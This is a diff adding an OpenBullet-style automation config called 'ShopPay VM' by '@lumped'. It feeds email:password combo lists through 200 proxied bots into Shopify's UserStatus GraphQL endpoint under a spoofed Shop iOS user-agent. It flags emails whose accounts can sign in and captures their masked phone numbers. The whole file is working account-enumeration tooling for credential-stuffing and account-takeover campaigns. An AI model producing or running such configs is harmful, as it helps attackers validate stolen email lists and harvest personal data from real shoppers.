@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "ShopPay VM(@lumped)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-19T16:12:21.4561267+01:00",
+  "AdditionalInfo": "",
+  "Author": "@lumped",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "?m?m?m?m?m?m?m?m-?m?m?m?m-?m?m?m?m-?m?m?m?m-?m?m?m?m?m?m?m?m?m?m?m?m" -> VAR "guid" 
+
+REQUEST POST "https://arrive-server.shopifycloud.com/graphql" 
+  CONTENT "{\"operationName\":\"UserStatus\",\"variables\":{\"input\":{\"email\":\"<USER>\"}},\"query\":\"query UserStatus($input: UserStatusInput!) {\\\\n  userStatus(input: $input) {\\\\n    userErrors {\\\\n      message\\\\n      __typename\\\\n    }\\\\n    userStatus {\\\\n      email\\\\n      canSignIn\\\\n      phone\\\\n      signInMethod\\\\n      emailVerificationRequired\\\\n      __typename\\\\n    }\\\\n    __typename\\\\n  }\\\\n}\\\\n\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-us" 
+  HEADER "content-type: application/json" 
+  HEADER "user-agent: Shop/2.32.0-release.496 ios/14.4" 
+  HEADER "x-device-id: <guid>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "canSignIn\":true" 
+  KEYCHAIN Failure OR 
+    KEY "canSignIn\":false" 
+
+PARSE "<SOURCE>" JSON "phone" -> VAR "phone" 
+
+IF "<phone>" Contains "*"
+SET CAP "Phone Number" "<phone>"
+ELSE
+SET CAP "Phone Number" "None"
+ENDIF
+
+FUNCTION Constant "@lumped" -> VAR "Config By" 
+
